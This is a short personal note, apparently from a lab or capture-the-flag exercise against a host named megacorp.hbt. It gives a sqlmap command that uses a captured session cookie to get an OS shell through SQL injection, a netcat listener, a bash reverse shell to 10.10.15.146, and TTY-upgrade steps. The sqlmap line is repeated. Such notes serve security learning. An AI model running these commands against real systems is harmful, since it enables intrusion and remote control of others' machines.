---
title: 
draft: false
tags:
  - tag1
  - tag2
NeedsReview: true
---

# {{title}}

> [!abstract] Summary  
> A brief description of this note.  

Using known accessed cookie for user login (PHPSESSID), Inject SQL DB

sqlmap -u [http://megacorp.hbt/dashboard.php?search=](http://megacorp.hbt/dashboard.php?search=) --banner --os-shell --cookie=PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1

Let's run a bash reverse shell for our service running: # nc -lvnp 443

os-shell> bash -c "bash -i >& /dev/tcp/10.10.15.146/443 0>&1"

We beautify the reverse shell:

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL+Z

stty raw -echo

fg

export TERM=xterm

Using known accessed cookie for user login (PHPSESSID), Inject SQL DB

sqlmap -u [http://megacorp.hbt/dashboard.php?search=](http://megacorp.hbt/dashboard.php?search=) --banner --os-shell --cookie=PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1